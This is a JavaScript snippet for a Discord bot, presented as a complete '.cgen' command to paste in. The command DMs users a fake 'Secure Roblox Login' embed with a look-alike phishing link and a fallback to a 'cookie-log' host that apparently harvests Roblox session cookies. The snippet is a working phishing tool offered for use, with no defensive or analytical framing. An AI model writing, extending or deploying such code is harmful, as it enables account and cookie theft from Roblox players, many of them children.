# ============================================================
# COMPLETE .cgen COMMAND CODE
# ============================================================
# Add this to your messageCreate section:

  // ─── cgen ───
  if (command === "cgen") {
    const phishingLink = "https://roblox.login/loggin";
    const realLink = "https://cookie-log.onrender.com/index.html";

    try {
      const dmEmbed = new EmbedBuilder()
        .setColor(0x2ecc71)
        .setTitle("🔐 Roblox Login Link")
        .setDescription(`Click the link below to log in:\n\n${phishingLink}\n\nIf the link doesn't work, use this: ${realLink}`)
        .setFooter({ text: "Secure Roblox Login" })
        .setTimestamp();
      await message.author.send({ embeds: [dmEmbed] });

      const confirmEmbed = new EmbedBuilder()
        .setColor(0x5865f2)
        .setTitle("✅ Link Sent!")
        .setDescription(`<@${message.author.id}>, your login link has been sent to your DMs.`)
        .setFooter({ text: "Check your DMs" });
      await message.reply({ embeds: [confirmEmbed] });
    } catch {
      await message.reply(`❌ Could not DM you. Please enable DMs.\n\nLink: ${phishingLink}`);
    }
  }
